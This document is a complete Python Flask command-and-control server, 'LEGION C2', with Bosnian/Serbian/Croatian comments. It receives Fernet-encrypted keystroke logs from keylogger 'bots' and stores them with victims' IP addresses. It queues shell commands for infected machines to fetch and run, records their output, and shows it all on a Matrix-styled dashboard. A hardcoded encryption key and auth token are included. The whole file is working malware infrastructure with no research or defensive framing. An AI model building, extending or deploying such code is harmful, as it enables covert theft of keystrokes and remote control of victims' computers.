#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import base64
import datetime
import sqlite3
import logging
from functools import wraps
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
from cryptography.fernet import Fernet
import sys
import pkgutil

# Patch za Python 3.14
if not hasattr(pkgutil, 'get_loader'):
    pkgutil.get_loader = lambda x: None

# =====================================================================
# KONFIGURACIJA
# =====================================================================
app = Flask(__name__)
CORS(app)

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# =====================================================================
# ENKRIPCIJA
# =====================================================================
MY_KEY = b'PLSiCRE32cI0ErE5vgqCtpGJzy5UO4h5D3UDwgbYJ-A='
cipher = Fernet(MY_KEY)
print(f"[+] Encryption key loaded: {MY_KEY[:20]}...")

# =====================================================================
# BAZA PODATAKA
# =====================================================================
DB_PATH = 'c2_database.db'

def init_db():
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS keylogs
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      bot_id TEXT,
                      data TEXT,
                      timestamp TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS bots
                     (bot_id TEXT PRIMARY KEY,
                      first_seen TEXT,
                      last_seen TEXT,
                      ip_address TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS commands
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      bot_id TEXT,
                      command TEXT,
                      status TEXT,
                      result TEXT,
                      timestamp TEXT)''')
        conn.commit()
        conn.close()
        print("[+] Database initialized successfully")
        return True
    except Exception as e:
        print(f"[-] Database initialization error: {e}")
        return False

init_db()

# =====================================================================
# AUTENTIFIKACIJA
# =====================================================================
AUTH_TOKEN = "LEGION_C2_SECURE_TOKEN_2026"

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get('Authorization')
        if not auth_header or auth_header != f'Bearer {AUTH_TOKEN}':
            return jsonify({"status": "error", "message": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated

# =====================================================================
# FUNKCIJE ZA BAZU
# =====================================================================
def save_keylog(bot_id, data, timestamp):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO keylogs (bot_id, data, timestamp) VALUES (?, ?, ?)",
                  (bot_id, data, timestamp))
        conn.commit()
        conn.close()
        print(f"[+] KEYLOG SAVED: {bot_id} - {data[:30]}...")
        return True
    except Exception as e:
        print(f"[-] Error saving keylog: {e}")
        return False

def save_bot(bot_id, timestamp, ip_address):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO bots (bot_id, first_seen, last_seen, ip_address) VALUES (?, ?, ?, ?)",
                  (bot_id, timestamp, timestamp, ip_address))
        conn.commit()
        conn.close()
        print(f"[+] BOT SAVED: {bot_id}")
        return True
    except Exception as e:
        print(f"[-] Error saving bot: {e}")
        return False

def get_all_bots():
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT bot_id, first_seen, last_seen, ip_address FROM bots")
        bots = [{"bot_id": row[0], "first_seen": row[1], "last_seen": row[2], "ip": row[3]} for row in c.fetchall()]
        conn.close()
        return bots
    except Exception as e:
        print(f"[-] Error getting bots: {e}")
        return []

def get_recent_logs(limit=100):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT bot_id, data, timestamp FROM keylogs ORDER BY id DESC LIMIT ?", (limit,))
        logs = [{"bot": row[0], "data": row[1], "time": row[2]} for row in c.fetchall()]
        conn.close()
        return logs
    except Exception as e:
        print(f"[-] Error getting logs: {e}")
        return []

# =====================================================================
# RUTE - SVE RUTE!
# =====================================================================
@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_TEMPLATE)

# ====== RUTA ZA KEYLOG ======
@app.route('/keylog', methods=['POST'])
@require_auth
def receive_keylog():
    try:
        print("[*] ===== NEW KEYLOG REQUEST =====")
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No data"}), 400
        
        bot_id = data.get('id')
        log_data = data.get('data')
        timestamp = data.get('timestamp', datetime.datetime.now().isoformat())
        
        print(f"[*] Bot ID: {bot_id}")
        print(f"[*] Data: {log_data[:50]}...")
        
        if not bot_id or not log_data:
            return jsonify({"status": "error", "message": "Missing fields"}), 400
        
        # Dekodiraj
        decoded_log = None
        try:
            encrypted = base64.b64decode(log_data)
            decoded_log = cipher.decrypt(encrypted).decode('utf-8', errors='ignore')
            print(f"[+] Decrypted: {decoded_log}")
        except Exception as e:
            print(f"[-] Decryption error: {e}")
            try:
                decoded_log = base64.b64decode(log_data).decode('utf-8', errors='ignore')
                print(f"[+] Fallback: {decoded_log}")
            except:
                decoded_log = str(log_data)
                print(f"[+] Raw: {decoded_log}")
        
        # SAČUVAJ U BAZU
        print("[*] Saving to database...")
        save_keylog(bot_id, decoded_log, timestamp)
        save_bot(bot_id, timestamp, request.remote_addr)
        
        print(f"[+] ===== SUCCESS: Keylog from {bot_id} SAVED! =====")
        return jsonify({"status": "ok", "message": "Data received"}), 200
        
    except Exception as e:
        print(f"[-] ERROR: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# ====== RUTA ZA KOMANDE - OVO JE FALILO! ======
@app.route('/command', methods=['GET'])
@require_auth
def get_command():
    """Keylogger dohvata komande sa servera"""
    try:
        bot_id = request.args.get('id')
        if not bot_id:
            return jsonify({"status": "error", "message": "Missing bot_id"}), 400
        
        print(f"[*] Command request from {bot_id}")
        
        # Provjeri da li ima pending komandi
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT id, command FROM commands WHERE bot_id = ? AND status = 'pending' ORDER BY id ASC LIMIT 1",
                  (bot_id,))
        row = c.fetchone()
        conn.close()
        
        if row:
            command_id = row[0]
            command = row[1]
            print(f"[+] Sending command to {bot_id}: {command}")
            return jsonify({
                "status": "ok",
                "command_id": command_id,
                "command": command
            })
        else:
            return jsonify({"status": "ok", "command": None})
            
    except Exception as e:
        print(f"[-] Error in get_command: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# ====== RUTA ZA REZULTAT KOMANDE ======
@app.route('/result', methods=['POST'])
@require_auth
def command_result():
    try:
        data = request.get_json()
        command_id = data.get('command_id')
        result = data.get('result')
        status = data.get('status', 'completed')
        
        if not command_id:
            return jsonify({"status": "error", "message": "Missing command_id"}), 400
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("UPDATE commands SET status = ?, result = ? WHERE id = ?", (status, result, command_id))
        conn.commit()
        conn.close()
        
        print(f"[+] Command {command_id} completed with status: {status}")
        return jsonify({"status": "ok"})
        
    except Exception as e:
        print(f"[-] Error in command_result: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# ====== API RUTE ======
@app.route('/api/bots', methods=['GET'])
def api_bots():
    print("[*] API /bots called")
    try:
        bots = get_all_bots()
        return jsonify({"bots": bots})
    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({"bots": []}), 500

@app.route('/api/logs', methods=['GET'])
def api_logs():
    print("[*] API /logs called")
    try:
        logs = get_recent_logs(100)
        return jsonify({"logs": logs})
    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({"logs": []}), 500

@app.route('/api/commands', methods=['GET'])
def api_commands():
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT bot_id, command, status, timestamp FROM commands ORDER BY id DESC LIMIT 50")
        commands = [{"bot_id": row[0], "command": row[1], "status": row[2], "timestamp": row[3]} for row in c.fetchall()]
        conn.close()
        return jsonify({"commands": commands})
    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({"commands": []}), 500

@app.route('/api/send_command', methods=['POST'])
@require_auth
def api_send_command():
    try:
        data = request.get_json()
        bot_id = data.get('bot_id')
        command = data.get('command')
        
        if not bot_id or not command:
            return jsonify({"status": "error", "message": "Missing fields"}), 400
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        timestamp = datetime.datetime.now().isoformat()
        c.execute("INSERT INTO commands (bot_id, command, status, timestamp) VALUES (?, ?, ?, ?)",
                  (bot_id, command, "pending", timestamp))
        conn.commit()
        command_id = c.lastrowid
        conn.close()
        
        print(f"[+] Command sent to {bot_id}: {command}")
        return jsonify({"status": "ok", "command_id": command_id})
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# =====================================================================
# DASHBOARD TEMPLATE (isti kao prije)
# =====================================================================
DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>🐉 LEGION C2 – DASHBOARD</title>
    <meta charset="UTF-8">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body, html { height:100%; overflow:hidden; font-family:'Courier New',monospace; background:#000; }
        #matrix-canvas { position:fixed; top:0; left:0; width:100%; height:100%; z-index:0; background:#0a0a2a; }
        .content { position:relative; z-index:1; height:100vh; overflow-y:auto; padding:20px; background:rgba(10,10,30,0.85); color:#00ff41; backdrop-filter:blur(2px); border-left:2px solid #00ff41; border-right:2px solid #00ff41; max-width:98%; margin:0 auto; box-shadow:0 0 30px rgba(0,255,65,0.2); }
        .container { max-width:1400px; margin:0 auto; }
        h1 { color:#00ff41; border-bottom:2px solid #00ff41; padding-bottom:10px; text-shadow:0 0 10px #00ff41; font-size:2.2em; letter-spacing:3px; }
        .stats { display:flex; gap:20px; flex-wrap:wrap; margin:20px 0; }
        .stat-box { background:rgba(0,20,0,0.7); padding:15px 25px; border:1px solid #00ff41; border-radius:8px; box-shadow:0 0 15px rgba(0,255,65,0.3); }
        .stat-box h3 { margin:0; color:#00ff41; font-size:0.9em; text-transform:uppercase; letter-spacing:1px; }
        .stat-box span { font-size:28px; font-weight:bold; }
        table { width:100%; border-collapse:collapse; margin:20px 0; background:rgba(0,10,0,0.6); }
        th, td { border:1px solid #00ff41; padding:8px 12px; text-align:left; }
        th { background:rgba(0,30,0,0.8); color:#00ff41; }
        .command-input { width:70%; padding:10px; background:#0a0a1a; color:#00ff41; border:1px solid #00ff41; border-radius:4px; font-family:monospace; }
        .btn { background:#00ff41; color:#0a0a0a; border:none; padding:10px 20px; cursor:pointer; font-weight:bold; border-radius:4px; transition:all 0.3s; }
        .btn:hover { background:#00cc33; box-shadow:0 0 20px #00ff41; }
        .tab { display:inline-block; padding:10px 20px; background:rgba(0,20,0,0.7); cursor:pointer; border:1px solid #00ff41; border-bottom:none; border-radius:8px 8px 0 0; color:#00ff41; margin-right:5px; }
        .tab.active { background:#00ff41; color:#0a0a0a; }
        .tab-content { display:none; padding:20px; border:1px solid #00ff41; border-top:none; background:rgba(0,10,0,0.5); border-radius:0 0 8px 8px; }
        .tab-content.active { display:block; }
        .log-box { background:rgba(0,10,0,0.7); padding:10px; max-height:400px; overflow-y:auto; font-size:13px; white-space:pre-wrap; border-radius:4px; border:1px solid #00ff41; }
        .refresh { float:right; }
        select, input { background:#0a0a1a; color:#00ff41; border:1px solid #00ff41; padding:5px; }
        ::-webkit-scrollbar { width:8px; }
        ::-webkit-scrollbar-track { background:#0a0a1a; }
        ::-webkit-scrollbar-thumb { background:#00ff41; border-radius:4px; }
        .bot-info { color:#ff8800; }
        .highlight { background:rgba(0,255,65,0.1); }
    </style>
</head>
<body>
<canvas id="matrix-canvas"></canvas>
<div class="content">
<div class="container">
    <h1>🐉 LEGION C2 – DASHBOARD</h1>
    <div class="stats">
        <div class="stat-box"><h3>🤖 BOTOVI</h3><span id="total_bots">0</span></div>
        <div class="stat-box"><h3>📦 LOG PAKETA</h3><span id="total_logs">0</span></div>
        <div class="stat-box"><h3>⏳ KOMANDE</h3><span id="total_commands">0</span></div>
    </div>
    <div style="margin:20px 0;">
        <span class="tab active" onclick="showTab('logs')">📜 Keylog</span>
        <span class="tab" onclick="showTab('commands')">⚡ Komande</span>
        <span class="tab" onclick="showTab('bots')">🤖 Botovi</span>
    </div>
    <div id="tab-logs" class="tab-content active">
        <button class="btn" onclick="refreshLogs()">🔄 Osvježi</button>
        <div id="logs_table"><div class="log-box">🔄 Učitavanje...</div></div>
    </div>
    <div id="tab-commands" class="tab-content">
        <h3>📤 Pošalji komandu</h3>
        <select id="cmd_bot"></select>
        <input type="text" id="cmd_input" class="command-input" placeholder="npr: whoami ili ls ili ipconfig">
        <button class="btn" onclick="sendCommand()">▶ Pošalji</button>
        <div id="command_result"></div>
        <hr>
        <h3>📋 Historija komandi</h3>
        <div id="commands_table"></div>
    </div>
    <div id="tab-bots" class="tab-content">
        <h3>🤖 Aktivni botovi</h3>
        <div id="bots_table"></div>
    </div>
</div>
</div>
<script>
(function matrixRain(){const canvas=document.getElementById('matrix-canvas');const ctx=canvas.getContext('2d');canvas.width=window.innerWidth;canvas.height=window.innerHeight;const cols=Math.floor(canvas.width/20);const drops=[];for(let i=0;i<cols;i++)drops[i]=Math.floor(Math.random()*canvas.height/20);const chars=['0','1'];function draw(){ctx.fillStyle='rgba(10,10,42,0.05)';ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle='#00ff41';ctx.font='20px monospace';for(let i=0;i<drops.length;i++){const char=chars[Math.floor(Math.random()*chars.length)];const x=i*20;const y=drops[i]*20;ctx.fillText(char,x,y);if(y>canvas.height&&Math.random()>0.975)drops[i]=0;drops[i]++;}requestAnimationFrame(draw);}draw();window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;});})();

function showTab(tab){document.querySelectorAll('.tab-content').forEach(el=>el.classList.remove('active'));document.getElementById('tab-'+tab).classList.add('active');if(tab==='logs')refreshLogs();if(tab==='commands')refreshCommands();if(tab==='bots')refreshBotsTable();}
async function apiCall(endpoint,method='GET',data=null){const options={method,headers:{'Content-Type':'application/json'}};if(data)options.body=JSON.stringify(data);const response=await fetch('/api/'+endpoint,options);return response.json();}
async function refreshLogs(){const data=await apiCall('logs');const table=document.getElementById('logs_table');let html='<div class="log-box">';if(data.logs){data.logs.forEach(log=>{html+=`<span style="color:#ff8800;">[${log.time}]</span> <span style="color:#00ff41;">${log.data}</span>\n`;});}html+='</div>';table.innerHTML=html;document.getElementById('total_logs').textContent=data.logs?data.logs.length:0;}
async function refreshBots(){const data=await apiCall('bots');document.getElementById('total_bots').textContent=data.bots?data.bots.length:0;}
async function refreshBotsTable(){const data=await apiCall('bots');const table=document.getElementById('bots_table');let html='<table><tr><th>Bot ID</th><th>IP</th><th>Prvi put</th><th>Zadnji put</th></tr>';if(data.bots){data.bots.forEach(bot=>{html+=`<tr><td class="bot-info">${bot.bot_id}</td><td>${bot.ip||'N/A'}</td><td>${bot.first_seen}</td><td>${bot.last_seen}</td></tr>`;});}html+='</table>';table.innerHTML=html;}
async function sendCommand(){const bot=document.getElementById('cmd_bot').value;const command=document.getElementById('cmd_input').value;if(!bot||!command)return;try{const data=await apiCall('send_command','POST',{bot_id:bot,command:command});document.getElementById('command_result').innerHTML=data.status==='ok'?'✅ Komanda poslata':'❌ Greška';document.getElementById('cmd_input').value='';refreshCommands();}catch(e){document.getElementById('command_result').innerHTML='❌ Greška: '+e.message;}}
async function refreshCommands(){const data=await apiCall('commands');const table=document.getElementById('commands_table');let html='<table><tr><th>Bot</th><th>Komanda</th><th>Status</th><th>Vrijeme</th></tr>';if(data.commands){data.commands.forEach(cmd=>{html+=`<tr><td>${cmd.bot_id}</td><td>${cmd.command}</td><td>${cmd.status}</td><td>${cmd.timestamp}</td></tr>`;});}html+='</table>';table.innerHTML=html;document.getElementById('total_commands').textContent=data.commands?data.commands.length:0;}
async function updateBotSelect(){const data=await apiCall('bots');const select=document.getElementById('cmd_bot');select.innerHTML='';if(data.bots){data.bots.forEach(bot=>{const option=document.createElement('option');option.value=bot.bot_id;option.textContent=bot.bot_id;select.appendChild(option);});}}
setInterval(()=>{refreshLogs();refreshBots();updateBotSelect();},5000);
refreshLogs();refreshBots();refreshCommands();updateBotSelect();
</script>
</body>
</html>
"""

# =====================================================================
# START
# =====================================================================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    print("="*50)
    print("🐉 LEGION C2 SERVER")
    print("="*50)
    print(f"[+] Server starting on port {port}")
    print(f"[+] Auth token: {AUTH_TOKEN}")
    print(f"[+] Encryption key: {MY_KEY[:20]}...")
    print("="*50)
    app.run(host="0.0.0.0", port=port, debug=False)
